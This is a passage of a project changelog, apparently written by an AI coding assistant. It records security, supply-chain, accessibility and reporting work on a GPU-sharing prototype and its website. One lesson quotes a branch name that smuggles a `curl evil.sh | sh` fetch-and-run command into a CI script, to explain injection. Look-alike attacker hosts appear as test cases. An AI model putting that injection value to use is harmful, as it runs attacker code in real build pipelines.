@@ -677,3 +677,1025 @@
 2. **Tie the clock, not the caller.** The windows start at fixed times, so nobody can restart one by asking at a clever moment. If the snapshot refreshed "15 minutes after the last request", a rig could control when it happens.
 3. **When you change one thing, look for who relied on it.** The rehearsal's safety check quietly depended on live counts; batching them would have made it miss real queued work. Searching for every reader of a field before changing it found that.
 4. **Name what's left.** The fix makes the hint weaker, not impossible, on a tiny network. Writing that down keeps the docs honest and tells you what would help (more rigs, longer window).
+
+## 2026-11-23 (14:20 UTC): A public logbook for signed reports, on the site and on GitHub (0.5.42)
+
+**Your decision:** signed points reports and ledger copies get posted on a page on the site *and* on GitHub. Both are the same thing: a new `reports/` folder in the repo. GitHub keeps its full history, and Netlify serves it at **boatsnhoes.meme/reports/** once this is merged.
+
+**Shipped**
+- **The page (`/reports/`).** Same orange/black style as /contribute. It lists every published period with its dates, rigs, results, simulated points, the download links and the report's fingerprint (`sha256`), shows the coordinator's signing key, and gives copy-paste commands to check it all. The FAQ explains the 7-day wait, what's removed from the copies, why it's on both the site and GitHub, and what checking does and doesn't prove. Today it honestly says "No periods published." The list is built from `reports/index.json` with `textContent` only, so nothing in that file can run as code. /contribute's footer links to it; your homepage is untouched.
+- **The GitHub side.** `reports/README.md` explains the folder to anyone browsing GitHub: the layout (one folder per period with `report.json`, `ledger-copy.sqlite3`, `SHA256SUMS`), how to check it, and how you publish.
+- **The publishing tool (`python -m app.publish_report add`).** It refuses unless the report is signed by the key you give and unedited, the database file is a redacted copy (it will never post the live ledger, which holds keys, prompts and answers), the copy ends where the period ends and re-creates the identical report, the period ended at least 7 days ago, it doesn't overlap a posted period, and the earlier history is unchanged (`ledger_copy compare` against the last copy). It copies the files byte for byte, the folder appears in one step, and nothing already posted is ever replaced. `--dry-run` runs every check and writes nothing. It doesn't touch git: you commit, open a pull request, merge.
+- **Anyone can re-check everything (`python -m app.publish_report check`).** Hashes, checksum files, signatures, each report against its copy, each copy against the one before, and no stray folders. CI now runs it on every change to `reports/`, and a test runs it on the real folder.
+- **Proof.** 626 tests, all passing (11 new). I broke the tool 11 ways. 9 were caught straight away. One miss showed the overlap test only tried a period going backwards, so I added a real overlap case (a period starting 10 seconds before the last one ended); now caught. The other miss was the "report is not signed" check, which turned out to be covered by the signature check anyway; it stays only because its error message tells you how to fix it. I also published two made-up periods into a throwaway copy of the site and viewed the page at phone width (390 px) and desktop (1440 px): both periods listed, the key shown, no sideways scrolling, no script errors.
+- **Honest limits:** nothing is published yet, because there are no real periods until the rigs run real jobs. Rig names appear in public files, so name rigs something that doesn't identify people. The 7-day wait is my default, so change it if you like. I couldn't run the full W3C HTML validator here (that tool was blocked); I checked the page structure with a parser instead (no unclosed tags, no duplicate ids).
+
+**What you learned**
+1. **One folder, two front doors.** Netlify publishes the repo as-is, so a folder in GitHub *is* a page on the site. No syncing, no second copy to drift.
+2. **Make the tool refuse the dangerous mistake.** The worst thing that could happen is posting the live database. The tool checks for the "this is a redacted copy" label and won't publish anything without it.
+3. **Never replace, only add.** Proving "we didn't rewrite history" only works if every old copy stays up. So the tool can add a period but has no way to overwrite one.
+4. **Let the robot re-check.** CI runs the same check anyone else can run, so a broken or edited file fails the build before it reaches the site.
+
+## 2026-11-23 (14:30 UTC): Who agreed with a rig that got caught? (0.5.43)
+
+**Housekeeping first:** PR #4 was merged into main at 14:07 (squashed), and another session pushed the public logbook (0.5.42) to the drafts branch while this one was working. I merged both in; the only clashes were in the version line, changelog and this log, so this entry is 0.5.43.
+
+**Shipped**
+- **The gap (threat model #3).** Re-checks catch a rig that fakes an AI answer, unless the rig that re-checks it is a friend. Then both answers match, both are marked *confirmed*, and nothing looks wrong. Random auditor picks (0.5.8) make that rarer, but when it happens the software can't see it.
+- **What can be seen later.** Sooner or later the cheater gets caught: it fails a hidden known-answer test or is outvoted in a tie-breaker (a "strike"). From that moment, every rig whose answer *agreed* with it earlier deserves a second look.
+- **The vouch check (`vouch-check-v1`).** `GET /v1/operator/vouches` (operator token) or `python -m app.vouches` (opens the database read-only) lists:
+  - **caught rigs**, with their strikes;
+  - **leads**: every rig that agreed with a caught rig, how many times and with whom, and how many hidden tests it has passed itself. Two caught rigs that agreed with each other come first;
+  - **weak confirmations**: confirmed results whose *only* independent agreement came from a caught rig, with their simulated points.
+- **Operator health** now has a `vouches` summary and warns about leads that aren't revoked, aren't already caught, and have never passed a hidden test, with the next step: aim a hidden test at each (`target_worker`, or `challenge_pool issue ... --worker <id>`). An honest rig passes and loses nothing; a colluder has to answer honestly or earn its own strike.
+- **What it doesn't do:** change points, statuses, trust tiers or who audits. Weakly confirmed points stay paid until scoring v2 (your decision) says otherwise. The report holds no prompts or answers, but it names who checked whom, so it is operator-only.
+- **Proof.** 12 new tests (638 total with the logbook session's, all passing), using the real API: a rig that confirmed a later-caught rig's work becomes a lead; a caught rig acting as auditor makes the result it confirmed weak; a tie-breaker that sided with a later-caught rig is a lead; rigs that outvoted the cheater are *not* leads; passing an aimed hidden test clears the warning but keeps the lead on the list; revoked leads aren't warned about; the CLI changes nothing in the database; no answers or prompts appear in the report. I then broke the code 11 ways (everyone counted as caught, "weak" meaning any caught partner, no caught-pairs-first order, revoked or caught rigs in the warning, passed tests ignored, a rig paired with itself, outvoted results counted as agreeing, no token check, only the original considered, wrong hidden-test count); two survived the first round (they only show up with three agreeing rigs or a particular ordering), so I added a focused test, and now every one is caught. Not run against a live coordinator: confirmations only happen on AI jobs, which need llama-cli and a model. Software only; nothing here touches the GPUs.
+- **Honest limits:** it only starts once one ring member is caught; on a small network almost every rig will be a lead at first (honest rigs agree with a cheater whenever the cheater happened to be honest); and sending the tests is still a manual step.
+
+**What you learned**
+1. **Agreement is only as good as who agrees.** "Two rigs got the same answer" proves something only if the two rigs are independent. When one turns out to be a cheater, every "yes" it gave or got loses its value.
+2. **Look backwards when you catch someone.** Banks do this with fraud: when one account is caught, they review every account it traded with. Catching one cheater is a lead to the next one.
+3. **A lead is not a verdict.** Most rigs on the list will be honest. The fair response is a cheap test everyone honest passes (a hidden known-answer job), not a penalty.
+4. **Test the tests.** Breaking the code on purpose showed two gaps in the first set of tests. A test suite you've never seen fail doesn't prove much.
+
+## 2026-11-23 (15:25 UTC): One command to test every rig that agreed with a caught rig (0.5.44)
+
+**Shipped**
+- **The gap.** Last session's vouch check lists the rigs that agreed with a rig that was later caught ("leads"), and says the fair next step is a hidden known-answer test aimed at each. But sending them was by hand, one rig at a time, and nothing told you which rigs already had a test on the way. Run it twice and the same rig would get two tests (wasting your private stock and making that rig's tests easier to spot).
+- **The vouch check now knows what's waiting (`lead-tests-v1`).** Each lead shows `open_aimed_tests` (hidden tests aimed at it by name that it can still take before their deadline) and `task_types` (the kinds of job it agreed on). A new list, `leads_to_test`, is the unchecked leads with nothing waiting. The health warning adds "N already have one waiting".
+- **`python -m app.challenge_pool issue-leads`.** Reads that list from the coordinator and aims **one** test from your private pool at each rig on it, picking a test of a job type the rig actually agreed on (an AI-job lead gets an AI test, not a practice SHA-256 one; `--task` overrides). It goes through the same safe path as `issue`: each test is crossed off before it's sent, put back only if the coordinator clearly refused it, and a test a ledger copy already revealed is retired and another one tried. `--dry-run` shows who would get a test and sends nothing. `--max` (default 10) limits how many rigs per run, most suspicious first. It refuses an older coordinator that can't say what's waiting, stops at the first refusal, and prints only rig names and job ids.
+- **Proof.** 656 tests, all passing (18 new). On the way, the tests caught a real bug in my first version: with two leads, both waiting tests were counted against the same rig, so the second run sent another test to the other one. The cause was a database column name clash (the jobs table already has a `worker_id` column, so grouping by my `worker_id` label grouped by the wrong thing). Fixed and kept the test. Then I broke the code 12 ways (expired tests counted, tier tests counted, waiting tests ignored, any task type used, dry run sending, no retry after a retired test, `--max` ignored, guessing on an old coordinator, not stopping, bad task type accepted, health note missing twice); one survived at first (tier tests counted), so I added a direct check, and now all 12 are caught. I also ran it against a real coordinator here: dry run worked, a wrong token was refused with exit 2. It couldn't send to real leads, because leads only come from confirmed AI jobs, which need llama-cli and a model. Software only; nothing here touches the GPUs.
+- **Honest limits:** you still run it yourself (nothing is sent automatically); it only matters once the pool has real answers from the pinned model; tier-aimed tests don't count as "waiting" because the rig they land on is picked at hand-out.
+
+**What you learned**
+1. **Make the safe thing easy.** A follow-up that takes ten manual commands gets skipped. One command that's safe to run twice gets run.
+2. **"Safe to run twice" is a feature you design.** The trick is checking what's already in flight before sending more. Programmers call this *idempotent*: doing it again changes nothing.
+3. **Names can collide in surprising places.** In SQL, the label I gave a calculated column had the same name as a real column, and the database picked the real one. The bug only showed up with two rigs, which is why tests with more than one of something matter.
+4. **Dry runs build trust.** Seeing exactly who would get a test, before anything is sent, lets you sanity-check a tool you didn't write.
+
+## 2026-11-23 (17:20 UTC): A checker for the live website's headers, redirects and links (0.5.45)
+
+**Why this, why now.** The GPU prototype's software work is done up to what needs the real rig or your decisions, so I took the next website item that needs neither: TASKS.md has had "Verify `_headers` on the live Netlify URL" and "Verify HTTPS, security headers and share card on the live URL" open since the site went live.
+
+**Shipped**
+- **`python -m app.site_check static`** (reads files only; CI now runs it whenever a page, `_headers`, `netlify.toml` or `assets/` changes). It checks:
+  - `_headers` gives every page the security headers: HSTS for at least 180 days, `nosniff`, a referrer policy that doesn't leak full addresses, a Content-Security-Policy, and framing by other sites blocked;
+  - everything each page loads (scripts, styles, images, icons, frames, form targets, and URLs its scripts `fetch()`) is allowed by that CSP. If not, the browser silently blocks it and the page breaks only on the live site;
+  - every local link and file exists (with Netlify's pretty URLs, so `/contribute` means `contribute.html`), and nothing links into a folder `netlify.toml` hides (`/docs/`, `/prototype/`, ...);
+  - pages with a share card have a title, description, image and `twitter:card`, the image is on this site and exists, and its stated size matches the real file.
+- **`python -m app.site_check live --url https://boatsnhoes.meme`** asks the real site, without following redirects: each main page answers 200 with *exactly* the values in `_headers`; `http://` redirects to `https://` on the same host; `www.` redirects to the bare domain; a real file inside each hidden folder answers 404, not 200; and the homepage's share image loads as an image. HTTPS certificates are checked by the request itself. Plain GET requests only, like a browser; it changes nothing.
+- **One-click version on GitHub:** a new workflow, **Actions > site-check > Run workflow**, runs the live check and keeps the JSON report. It only appears once this PR is merged into main. No secrets needed.
+- **Result on the repo today:** 0 problems, 3 notes: the homepage has no canonical URL (it's your homepage, so I didn't add one; it's in USER_TODO as optional), and the 404 and thanks pages have no share card (fine).
+- **Proof.** 37 new tests, 693 total, all passing. The live check runs against a real local web server and against a fake site that I break in specific ways (http not redirecting, redirecting to a look-alike host such as `example.test.evil`, www going elsewhere, a header dropped or changed, a page 404ing, a hidden folder served, a share image that's really HTML, the site unreachable). Then I broke the checker itself 20 ways; 18 were caught at once. The 2 that survived were real test gaps: `*.googleapis.com` also matching `evilgoogleapis.com`, and a www redirect to any site counting as fine. I added a test for each, and now all 20 are caught.
+- **Honest limits:** I could **not** run the live check against boatsnhoes.meme: this sandbox's network blocks the site (the run is recorded as "could not connect", not as a pass). So the TASKS items stay open until the workflow runs once. Links to other sites (GitHub) aren't fetched. If Netlify adds its own HSTS header on top of ours, the live check will show the combined value as a mismatch; that would be worth knowing, not a crisis. No site page changed in this session, so there was no layout to check at 390 px.
+
+**What you learned**
+1. **Headers are invisible instructions.** Every page comes with a few lines the visitor never sees ("only load scripts from here", "never let another site frame this page"). `_headers` is where you write them; the live check confirms Netlify actually sends them.
+2. **A CSP fails quietly.** If the policy forbids something a page uses, the browser just doesn't load it and the page looks broken with no error for the visitor. Checking every page against the policy before deploy catches that early.
+3. **Don't follow the redirect when testing the redirect.** To know that `http://` really sends people to `https://`, you have to look at the first answer, not where you end up, so the checker turns redirect-following off.
+4. **"Starts with" is a classic security bug.** `https://boatsnhoes.meme.evil.com` starts with `https://boatsnhoes.meme`. Checking for the trailing `/` (`https://boatsnhoes.meme/`) is what makes the match exact.
+
+## 2026-11-23 (18:25 UTC): Every installed package pinned, hash-checked and license-reviewed (0.5.46)
+
+**Why this, why now.** PR #5 had green CI and no conflicts, and the GPU prototype's remaining items need the rig or your decisions. The implementation prompt's security rules still had one open line: "Pin dependencies where practical and review licenses." Until now, `pip install -r requirements.txt` took whatever versions inside a range were newest that day, so two installs a week apart could run different code, and nobody had written down what licenses we ship.
+
+**Shipped**
+- **`prototype/requirements.lock`.** All 31 packages the prototype installs (the 8 we ask for plus the 23 they pull in) at one exact version each, with the sha256 fingerprint of every file. Installing with `pip install --require-hashes -r requirements.lock` refuses any file whose fingerprint doesn't match. Made with a **7-day cooldown**: only releases at least a week old, because a hijacked package is usually caught within days of being published.
+- **`prototype/licenses.json`.** Each package's license at its locked version, a plain sentence on why it's there, and the allowed list (MIT, MIT-0, BSD, Apache-2.0, ISC, PSF-2.0, MPL-2.0). Everything is permissive; the only MPL-2.0 one is `certifi` (the list of trusted HTTPS certificates), which we use unchanged, so it asks nothing of us.
+- **`python -m app.deps_check lock`** (reads files only): every package pinned with `==` and hashed; no line that points pip at another package index, a web address or a local folder; every package in `requirements.txt` is in the lock inside its allowed range; and `licenses.json` matches the lock version for version. A new package or a version bump **fails CI until someone reads its license** and updates the entry.
+- **`python -m app.deps_check installed`**: the environment it runs in has exactly the locked versions, and each package's own license metadata says the same thing as our review.
+- **CI** now installs from the lock with `--require-hashes` and runs both checks before the tests. The quick start in `prototype/README.md` uses the lock too. I added `packaging` to `requirements.txt` because the checker uses it directly.
+- **Proof.**
+  - 71 new tests, 764 total, all passing on Python 3.11 (what CI uses) and 3.12 (Ubuntu 24.04's default, likely your rig's), both installed from the lock.
+  - I broke the checker 18 ways on purpose (hash not required, `>=` accepted, other indexes allowed, OR read as AND and the reverse, license exceptions accepted, stale or outdated license entries ignored, Windows-only packages required everywhere, wrong versions ignored, files overwritten, duplicates and web addresses allowed, uppercase hashes accepted, ...). All 18 were caught.
+  - **The real thing:** I changed one package's fingerprints in a copy of the lock and asked pip to install it. pip stopped with "THESE PACKAGES DO NOT MATCH THE HASHES ... someone may have tampered with them" and installed nothing.
+  - A fresh clone, following the quick start word for word, installed from the lock, made a signing key, started the coordinator (`/health` said ok) and made an enrollment code, and left no untracked files behind.
+- **Honest limits:** a matching hash proves you got the same files as the day the lock was made, not that those files are safe. No scan for known security holes runs yet (I tried to fetch a scanner on the fly and this sandbox's safety check refused it; turning on Dependabot alerts is an optional one-click item in USER_TODO). The GitHub Actions in CI are pinned by version tag, not by commit (new TASKS item). Updating the lock needs a tool called `uv` (commands at the top of the file). Nothing here touches the GPUs or the website.
+
+**What you learned**
+1. **A version range is a promise about the future you can't check.** `fastapi>=0.110,<1` means "whatever's newest that day". A lock file turns that into one exact, repeatable list, so the code you tested is the code you run.
+2. **A hash is a fingerprint for a file.** Change one byte of a download and its sha256 is completely different. Writing the fingerprint down in advance means a swapped file is caught *before* it runs, not after.
+3. **Waiting a week is a cheap defense.** Most hijacked packages are found and pulled within days. Only accepting releases that have been out for 7 days lets the rest of the world find them first.
+4. **Licenses are part of what you ship.** Every package comes with rules. Writing each one down, and making CI fail when a new package arrives unread, means a restrictive license can't sneak in through a dependency of a dependency.
+
+## 2026-11-23 (19:20 UTC): CI's GitHub Actions pinned to exact commits, and a checker that keeps them that way (0.5.47)
+
+**Why this, why now.** PR #5 had green CI and no conflicts, and the GPU prototype's remaining items need the rig or your decisions. Last session added a TASKS item: "Pin the CI workflow's GitHub Actions to commit hashes instead of version tags." It's the same idea as the pinned Python packages, applied to the tools that run our tests.
+
+**Shipped**
+- **Both workflows pinned.** `actions/checkout@v4` and `actions/setup-python@v5` are now named by full 40-character commit hash, with `# v4, as of 2026-11-23` / `# v5, ...` on the same line so a person can still read them. **Where the hashes came from:** this repo's own CI log. When GitHub runs a step it writes "Download action repository 'actions/checkout@v4' (SHA:11d5960a...)"; I read those lines from the 18:25 UTC run and used exactly those. So CI now runs the same code it ran today, not whatever the tag points at tomorrow.
+- **`persist-credentials: false` on checkout.** By default, checkout leaves the job's GitHub token in `.git/config`, where every later step (including our 800+ tests) could read it. Nothing needs it, so it's gone.
+- **One less outside action.** The site-check workflow used `actions/upload-artifact` to keep its report. Instead, the JSON report is now written to the run's **summary page** (you open the run and it's right there). Fewer outside actions = fewer things to trust.
+- **`python -m app.workflow_check`** (reads files only; CI runs it, and CI now also runs whenever a workflow file changes). It fails when:
+  - a `uses:` names a tag or branch (`@v4`, `@main`), a short or uppercase hash, or a docker image without a `@sha256:` digest;
+  - a pinned action has no version comment, or the same action is pinned to two different commits in two workflows;
+  - the action's owner isn't on a reviewed list (today only `actions`, GitHub's own; e.g. `tj-actions/...` fails even when pinned);
+  - a workflow has no top-level `permissions:`, or asks for any `write` access (top level or per job);
+  - it uses the `pull_request_target` or `workflow_run` triggers (both run with this repo's access on code someone else can start);
+  - `actions/checkout` doesn't set `persist-credentials: false`;
+  - a `run:` script contains `${{ ... }}` (values must go through `env:` instead).
+- **Proof.** 61 new tests, **825 total, all passing** (Python 3.11, installed from the lock). The checker passes on both real workflows (22 checks) and failed on the old ones (7 problems: 5 actions pinned only by tag, and 2 checkouts leaving the token behind). Then I broke the checker 16 ways on purpose (accept uppercase or 12-character hashes, miss the YAML `on:` quirk, ignore checkout tokens, ignore `${{ }}` in scripts, allow two hashes, accept any owner starting with "actions", ignore `write-all` or job-level write, skip the missing-permissions check, read only the first comment, accept a version anywhere in the comment, accept docker tags, forget `workflow_run`, skip flow-style `uses`, skip job-level reusable workflows). 15 were caught at once; the "version anywhere in the comment" one survived until I added a `# v4x` test case. Now all 16 are caught.
+- `pyyaml` (already in the lock, license already reviewed) is now listed in `requirements.txt`, because the checker uses it directly.
+- **Honest limits:** the checker can't prove a hash really is the release its comment says; mine came from GitHub's own log of our CI, which is about as good as it gets without looking at other repositories. Pinned actions don't update themselves; an optional Dependabot file for that is in USER_TODO (it opens pull requests, so it's your call). The site-check workflow's new summary step only runs after merging, when you click Run workflow. Nothing here touches the GPUs or the website.
+
+**What you learned**
+1. **A tag is a sticky note; a commit hash is a fingerprint.** `@v4` points wherever the action's owner (or someone who took over their account) moves it. A 40-character hash names one exact version of the code forever.
+2. **This attack really happened.** In March 2025 the popular `tj-actions/changed-files` action was hijacked and its tags moved to code that printed secrets into public CI logs. Workflows pinned by hash weren't affected.
+3. **Give tools the least access that works.** Our CI only needs to read the code, so its token is read-only and isn't left on disk afterwards. If something in CI ever goes wrong, there's less it can do.
+4. **`${{ }}` is copy-paste, not a variable.** GitHub pastes the value into the script *before* it runs, so a branch named `x"; curl evil.sh | sh; "` becomes part of your command. Putting it in `env:` makes it plain data.
+
+## 2026-11-24 (UTC): Checking our pinned packages for known security holes, and the first one it found (0.5.48)
+
+**Why this, why now.** PR #5 had green CI and no merge conflicts (it's waiting on your review, which is the "blocked" GitHub shows). The GPU prototype's open items need the rig or your decisions. The highest unfinished item that needed neither was in Phase 4: "Scan locked packages for known vulnerabilities." Two sessions ago we pinned every package to one exact version; this checks whether any of those exact versions is known to be broken.
+
+**Shipped**
+- **`python -m app.vuln_check`.** For each of the 32 locked packages it asks PyPI (the Python package index) about that exact version. PyPI's answer includes the known security problems for it, taken from the OSV database (the same source the popular `pip-audit` tool uses). It only sends package names and versions, and changes nothing.
+  - One problem often has 2-3 names (a GitHub `GHSA-...` id, a Python `PYSEC-...` id, a `CVE-...` number). They're merged and shown once, with the version that fixes it.
+  - If PyPI can't be reached, doesn't know the version, or answers about something else, that package **fails**. "I couldn't check" is never treated as "clean".
+- **`prototype/vuln-exceptions.json`** (empty). If one day a problem can't be fixed right away, a person can accept it for now: which package, which problem, a sentence on why it can't hurt us, the review date and an end date at most 90 days later. On the end date it fails again so it gets looked at.
+- **New GitHub workflow `vuln-check`** runs it when the lock changes, **every Monday**, and by hand (Actions > vuln-check > Run workflow). If a Monday run fails, GitHub emails you. It's separate from the main CI so a problem published about an old package doesn't block unrelated work.
+- **It found a real one on its first run.** `pytest` 8.4.2 (the tool that runs our tests) has CVE-2025-71176: on a computer shared by several users, another user could mess with pytest's temporary folders. Low risk for us (test-only, one-user CI), but the fix was easy, so I raised it to `pytest` 9.2.0 (released 2026-10-27, so it passes our 7-day waiting rule) and re-made the lock changing only pytest. Second run: 32 of 32 clean.
+- **Proof.** 45 new tests, **870 total, all passing** on Python 3.11 (what CI uses) and 3.13, installed from the new lock with hash checking. The dependency, license, workflow, logbook and site checks all still pass. I broke the checker 17 ways on purpose (stop merging duplicate ids, treat "couldn't reach PyPI" as a pass, ignore end dates, accept an answer about the wrong version, allow 1-year exceptions, count withdrawn reports, no retry, follow a redirect to another site, case-sensitive ids, an exception for one package excusing another, ...). 16 were caught at once; one (not escaping odd characters in the web address) slipped past a weak test, so I tightened the test and now it's caught.
+- **Honest limits:** it only knows problems someone has found and published, so a pass means "nothing known today", not "safe". It covers the Python packages only, not llama.cpp, the GPU driver or the operating system. The workflow first runs after this is merged.
+
+**What you learned**
+1. **Pinning and scanning are two halves.** Pinning makes sure you get the same files every time. Scanning tells you when those same files turn out to have a hole. Without scanning, a pin can keep you on a bad version forever.
+2. **A CVE is a public ID for one security problem** (like a case number). The same problem often also gets a GitHub id and a Python id, which is why the tool merges them.
+3. **"Couldn't check" must never look like "all clear".** A scanner that quietly passes when the network is down gives you false comfort exactly when you can't see anything.
+4. **Exceptions should expire.** "We'll accept this for now" turns into "forever" unless something forces a second look; the 90-day end date is that something.
+
+## 2026-11-24 (UTC): Signed worker releases, so no single person (or stolen key) can push a bad download (0.5.49)
+
+**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). The GPU items need the rig or your decisions. The highest unfinished item that needed neither was in Phase 4 Security: "Signed miner releases with checksums (multi-signer)". It answers SECURITY threat #2 (fake miners: "download the new version here") and #8 (one person's key being enough).
+
+**Shipped**
+- **`python -m app.release`** with four commands:
+  - `keygen`: each signer makes their own private key once. It's saved readable by them only, never overwrites an old key, and is refused inside any git folder so it can't be committed by accident. It prints one line (the public half) to send you.
+  - `make`: takes a clean checkout and writes `release.json`: every file git tracks, with its sha256 fingerprint and size, plus the commit it came from. It also writes a plain `SHA256SUMS` file, so anyone can check the files with the standard `sha256sum -c` command, no special tools. Files git doesn't track (`.env`, keys, databases) are never included.
+  - `sign`: each signer adds their signature on their own computer. One signature per person and per key; it won't sign a broken or mixed-up release.
+  - `verify`: what a rig runs before starting new worker code. It passes only when **at least 2 different people from your pinned signer list** signed exactly this release, every signature from a listed person is valid, and (with `--root`) every file on disk matches, nothing is a shortcut (symlink), and no extra Python file has been slipped in. `--not-older-than` refuses an old signed version (so nobody can hand a rig an old release with a bug we already fixed).
+- **Proof.**
+  - 54 new tests, **924 total, all passing** (Python 3.13 here; CI runs 3.11).
+  - I broke the tool 20 ways on purpose (allow 1 signer, count one person twice, accept a listed name with someone else's key, drop the signature's purpose label, skip the "signed this exact release" check, compare only file sizes, treat an extra `.py` file as harmless, ignore symlinks, ignore paths outside the folder, ignore the version floor, overwrite releases, allow uncommitted changes, allow keys in git folders, ...). 19 were caught at once. "Ignore symlinks" survived because my only symlink test pointed outside the folder (caught by a different check), so I added a test with a shortcut *inside* the folder. Now all 20 are caught.
+  - **Real run on this repo:** I made a release of `prototype/` (93 files), signed it with two throwaway test keys, and `sha256sum -c` agreed with every file. `verify` then said **NOT OK** because the two new files from this session weren't committed yet, which is exactly what it should say about Python files outside the release.
+- **Honest limits:** a valid release means enough named people agreed to ship exactly these files. It doesn't prove the code is safe or that a signer's computer was clean. It covers the worker's Python files, not llama.cpp, model files (those already have their own pins) or the operating system. **No real signers exist and nothing has been signed yet:** picking at least 2 people is your call (USER_TODO, "Set up multiple release signers").
+
+**What you learned**
+1. **A checksum says "same file"; a signature says "who vouches for it".** A sha256 list alone can be swapped along with the files. A signature over that list ties it to a person's key.
+2. **"2 of 3" beats "1 of 1".** If one signer's laptop is stolen, the thief still can't publish a release alone. That's the same idea banks use for vaults with two keys.
+3. **The rig must already know who the signers are.** If a download could bring its own signer list, a fake download would bring a fake list. That's why the list is pinned on the rig ahead of time.
+4. **Old but genuine can still hurt.** A properly signed old version may contain a bug we fixed later; refusing anything older than a set version stops that "rollback" trick.
+
+## 2026-11-24 (10:20 UTC): An accessibility check for every page, and what it found (0.5.50)
+
+**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions, and the website rules allow accessibility work that needs no owner call. Nothing checked whether the site works for people using a screen reader, a keyboard instead of a mouse, zoom, or "reduce motion", or whether text is readable against its background.
+
+**Shipped**
+- **`python -m app.a11y_check`** (reads files only; CI now runs it on every site change). For each page it reads the HTML and the CSS the page loads and checks:
+  - the page says its language, has a title, and lets phones zoom in;
+  - every image has a description (`alt`, empty for decoration), and drawings are either hidden from screen readers or labelled;
+  - every link and button has words a screen reader can say, and every form field has a label (a grey hint inside the box doesn't count);
+  - one main heading, no skipped heading levels, one main area, and a "Skip to content" link first on pages with a menu that really lands in the main area;
+  - no duplicate ids, no labels pointing at nothing, no forced keyboard order, nothing reachable by keyboard but hidden from screen readers;
+  - **text contrast** of at least 4.5:1 (the common WCAG AA bar) against the background the text really sits on: its own, or a parent's (a card, a button, an inline style), every stop of a colour gradient, see-through colours blended; the keyboard focus ring at least 3:1; a "reduce motion" rule whenever something moves.
+  - Colours it can't read are listed as notes, never quietly passed.
+- **Your homepage is checked but never failed.** It's your approved design, so its findings are notes; CI stays green.
+- **Result: all 4 subpages (/contribute, /reports/, /thanks, 404) pass with nothing to fix.** The homepage has 7 notes, the biggest being white text on the light-orange "Get Started" button (1.8:1). I didn't touch it; the list is in USER_TODO.
+- **Second opinion.** I ran axe-core 4.10.2 (the most widely used open-source accessibility engine) in a real Chromium browser at desktop (1440 px) and phone (390 px) widths. Subpages: **0 problems**, including /contribute after pressing "Check this device" (content a script adds, which my file-reading check can't see), and no sideways scrolling. Homepage: it agreed on the heading jump and found one thing mine doesn't check (an `<aside>` inside `<main>`). It also showed why mine is useful: axe doesn't judge text on gradients at all ("needs review"), which is exactly where the homepage button problem is.
+- **Proof.**
+  - 70 new tests, **994 total, all passing** (Python 3.13, installed from the hash-checked lock). Workflow, site, dependency and license checks all still pass.
+  - The first version wrongly flagged three homepage things (text in the orange box judged against the black page; an empty decorative dot; a green label whose inline style was ignored) and missed that the logo link isn't a skip link. I wrote a failing test for each, then fixed the checker.
+  - I broke the checker 20 ways on purpose (lower the 4.5 bar, ignore see-through colours, check only the first gradient colour, count hidden text, accept a placeholder as a label, ignore which CSS rule wins, ignore inline styles, treat `>` like any descendant, skip `:hover` colours, fail your homepage, ...). 15 were caught at once; the other 5 slipped past tests that weren't sharp enough, so I added those tests. Now all 20 are caught.
+- **Honest limits:** it's a file reader, not a screen reader. It can't judge wording, it compares text a script adds later with the page background, and unusual CSS selectors fall back to that too. A pass means "none of these known problems", not "fully accessible". Nothing on the live site changed.
+
+**What you learned**
+1. **Contrast is a number.** It's the brightness of the lighter colour divided by the darker one (with a small offset), from 1:1 (invisible) to 21:1 (black on white). 4.5:1 is the usual minimum for normal text; your white-on-light-orange button is 1.8:1, which is hard to read in sunlight or with weaker eyesight.
+2. **A screen reader reads names, not pictures.** A logo link with no text is announced as just "link". An `aria-label="Boats n Hoes home"` gives it words; `alt=""` tells it an image is only decoration.
+3. **Keyboard users need a shortcut past the menu.** A hidden "Skip to content" link that appears when you press Tab saves pressing Tab through every menu item on every page.
+4. **Two tools beat one.** Each checker had a blind spot the other covered (gradients for axe, script-made content for mine), so running both found more than either alone.
+
+## 2026-11-24 (UTC): A "Stay safe" page, because fakes show up before the real coin does (0.5.51)
+
+**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions. On the website list, "Rebuild or upload Mine, Tokenomics, Stay Safe pages" was open; Mine and Tokenomics depend on supply and launch choices you haven't made, but Stay Safe doesn't. It answers SECURITY threat #2 (fake sites, fake miners, wallet drainers, fake admins), which is the most likely way someone gets hurt by this project's name before anything exists.
+
+**Shipped**
+- **New page `/stay-safe`** (`stay-safe.html`, same orange/black style as /contribute and /reports/):
+  - A plain callout: **there is no $BNH coin** (no token, presale, airdrop, wallet, exchange listing, casino or miner download). Anyone selling one is not us.
+  - **Six "we will never" rules** people can test any message against: ask for a recovery phrase, DM first, sell early coins, ask you to connect a wallet, send software by DM (or need admin rights / antivirus off), promise money.
+  - **Only two official places:** boatsnhoes.meme and the GitHub repo, with the common look-alike tricks (swapped letters, extra words, other endings). Social accounts are listed as **"not announced yet"**; I didn't invent any handles.
+  - **How to check a download** once one exists: `sha256sum -c` and the signed-release check from 0.5.49 (at least two named signers, signer list posted first). It says clearly that nothing is released yet.
+  - **How to report a fake** (a GitHub issue) and a security hole (an issue *without* details, so it isn't made public), and what to do after a loss (and that "recovery services" charging a fee are a second scam).
+- **Linked** from the footers of /contribute and /reports/ and from the contribute FAQ answer about scam DMs. **Your homepage is unchanged.** A tiny new `assets/nav.js` only opens and closes the phone menu.
+- **A guard for every subpage:** new tests fail if any subpage (homepage excluded) says things like "to the moon", "100x", "guaranteed", "risk-free", "earn $50", "presale is live" or "claim your", including in the hidden share-card text. They also check the safety page keeps its honest statements, links only to our own site and GitHub, and passes the website and accessibility checkers.
+- **Proof.**
+  - 31 new tests, **1,025 total, all passing** (one release test only runs once the work is committed, as designed). Website check: 15 pass, 3 notes, no failures. Accessibility check: all 6 pages pass (homepage notes unchanged).
+  - In a real Chromium browser at phone (390 px), tablet (768 px) and desktop (1440 px) widths: no sideways scrolling, the phone menu opens and closes, no script errors.
